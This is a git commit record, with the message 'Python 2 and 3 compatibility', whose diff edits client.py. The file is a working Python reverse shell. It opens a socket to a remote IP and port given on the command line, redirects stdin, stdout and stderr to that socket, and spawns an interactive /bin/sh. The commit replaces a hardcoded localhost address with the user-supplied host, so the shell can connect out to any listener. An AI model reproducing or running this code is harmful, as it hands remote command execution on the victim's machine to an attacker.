0b2db70957b094bcb645a37d10a30ee4baa031f3
Christopher Welborn <cj@welbornprod.com>
2015-08-19 17:47:16 -0500

    Python 2 and 3 compatibility.

--- client.py
+++ client.py
@@ -3,19 +3,23 @@ import socket
 import subprocess
 from argparse import ArgumentParser
 
+
 def parse_cl():
     parser = ArgumentParser(description='Simple client socket implementation')
-    parser.add_argument('-i', '--ip', required=True, help='Remote ip for connection')
-    parser.add_argument('-p', '--port', type=int, required=True, help='Remote port')
+    parser.add_argument(
+        '-i', '--ip', required=True, help='Remote ip for connection')
+    parser.add_argument(
+        '-p', '--port', type=int, required=True, help='Remote port')
     return parser.parse_args()
+
 
 def runsock(host, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("127.0.0.1", 9900))
+    s.connect((host, port))
     os.dup2(s.fileno(), 0)
     os.dup2(s.fileno(), 1)
     os.dup2(s.fileno(), 2)
-    subprocess.call(["/bin/sh", "-i"])
+    subprocess.call(["/bin/sh", "-i"], shell=True)
 
 if __name__ == '__main__':
     args = parse_cl()
